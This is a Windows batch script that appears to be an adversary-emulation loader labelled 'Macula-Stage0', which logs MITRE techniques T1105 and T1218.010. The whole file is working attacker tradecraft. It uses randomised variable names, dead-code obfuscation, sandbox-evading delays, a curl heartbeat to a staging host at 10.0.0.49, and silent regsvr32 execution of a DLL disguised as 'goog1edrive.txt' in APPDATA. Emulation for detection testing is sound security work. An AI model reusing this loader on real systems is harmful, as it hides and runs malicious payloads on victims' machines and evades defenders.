@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants with random variable names
SET yktnwwf=%APPDATA%\8049\b0a6308e
SET fpakbq=Macula-Stage0-8049
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8049-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=goog1edrive.txt
SET fpldhe=8049

REM Log file path
SET "logpath=!APPDATA!\!yydue!\macula-simulations.log"
if not exist "!APPDATA!\!yydue!" mkdir "!APPDATA!\!yydue!"

REM Obfuscated LOLBIN strings
SET zxmqp=regsvr32.exe
SET ajkdx=C:\Windows\System32\regsvr32.exe

REM Initial state
SET nqjzm=0
GOTO bwfrsc

REM Dead code labels
:klpewq
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dead_code_executed>> "!logpath!" 2>nul
EXIT /B

:pzqftn
SET hjsnqw=useless
GOTO xwspln

:xwspln
REM Dead code block
SET /A vbnfg=5+3
GOTO qmlpoi

:qmlpoi
REM Never reached
GOTO END

REM State dispatch
:bwfrsc
IF !nqjzm!==0 GOTO pldnst
IF !nqjzm!==17 GOTO mqwfrt
IF !nqjzm!==42 GOTO yhkfgt
IF !nqjzm!==99 GOTO ghvbjk
GOTO END

REM Dead code branch
:mnlkst
IF 0==1 (
    GOTO pldnst
) ELSE (
    GOTO END
)

REM State 0: Initial delays and setup
:pldnst
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start=60s>> "!logpath!" 2>nul
timeout /t 60 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_end=60s>> "!logpath!" 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start>> "!logpath!" 2>nul
SET /A kjhsdf=%RANDOM% %% 20 + 10
timeout /t !kjhsdf! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_end=!kjhsdf!s>> "!logpath!" 2>nul

SET nqjzm=17
GOTO bwfrsc

REM More dead code
:vbnhjk
SET opaqzn=0
IF !opaqzn!==1 (
    GOTO mqwfrt
) ELSE (
    GOTO END
)

REM State 17: Heartbeat check
:mqwfrt
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_start=!rdzgrnne!>> "!logpath!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
SET hb_result=0
IF !ERRORLEVEL!==0 (
    SET hb_result=1
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_success>> "!logpath!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_failed=!ERRORLEVEL!>> "!logpath!" 2>nul
)

REM MITRE TTP logging
SET ttp_result=0
SET ttp_error=
IF !hb_result!==1 (
    SET ttp_result=1
) ELSE (
    SET ttp_error=connection_refused
)

REM Format timestamp for TTP log
FOR /F "tokens=2-4 delims=/ " %%a IN ("!DATE!") DO (
    SET mm=%%a
    SET dd=%%b
    SET yyyy=%%c
)
SET hh=!TIME:~0,2!
SET mi=!TIME:~3,2!
SET ss=!TIME:~6,2!
SET ms=!TIME:~9,2!
IF "!ms!"=="" SET ms=000
SET log_timestamp=!yyyy!-!mm!-!dd! !hh!:!mi!:!ss!.!ms!

REM Log TTP
echo [!log_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!ttp_result!:!ttp_error! >> "!logpath!" 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: interop_delay_start>> "!logpath!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: interop_delay_end>> "!logpath!" 2>nul

SET nqjzm=42
GOTO bwfrsc

REM Dead code chain
:tgbvnf
GOTO qazwsx
:qazwsx
GOTO edcrfv
:edcrfv
REM Unused
SET plmokn=0

REM State 42: Change directory and execute DLL
:yhkfgt
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!logpath!" 2>nul
cd /d "!yktnwwf!" 2>nul
IF !ERRORLEVEL!==0 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_success>> "!logpath!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_failed=!ERRORLEVEL!>> "!logpath!" 2>nul
)

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_exec_start=!edjwtl!>> "!logpath!" 2>nul
"!ajkdx!" /s "!edjwtl!"
SET exec_result=0
SET exec_error=
IF !ERRORLEVEL!==0 (
    SET exec_result=1
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_exec_success>> "!logpath!" 2>nul
) ELSE (
    SET exec_error=regsvr32_failed
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_exec_failed=!ERRORLEVEL!>> "!logpath!" 2>nul
)

REM Final delay
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_start>> "!logpath!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_end>> "!logpath!" 2>nul

REM MITRE TTP 1218.010 logging
SET ttp_result2=!exec_result!
SET ttp_error2=!exec_error!

FOR /F "tokens=2-4 delims=/ " %%a IN ("!DATE!") DO (
    SET mm2=%%a
    SET dd2=%%b
    SET yyyy2=%%c
)
SET hh2=!TIME:~0,2!
SET mi2=!TIME:~3,2!
SET ss2=!TIME:~6,2!
SET ms2=!TIME:~9,2!
IF "!ms2!"=="" SET ms2=000
SET log_timestamp2=!yyyy2!-!mm2!-!dd2! !hh2!:!mi2!:!ss2!.!ms2!

REM Log TTP 1218.010
echo [!log_timestamp2!][!omxgazu!]: !yydue!-!fpldhe!-T1218.010|Regsvr32=!ttp_result2!:!ttp_error2! >> "!logpath!" 2>nul

SET nqjzm=99
GOTO bwfrsc

REM Dead code before end
:okmijn
SET uhybgv=0
IF !uhybgv!==0 GOTO END

REM State 99: End
:ghvbjk
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_completion>> "!logpath!" 2>nul
GOTO END

:END
ENDLOCAL
EXIT /B 0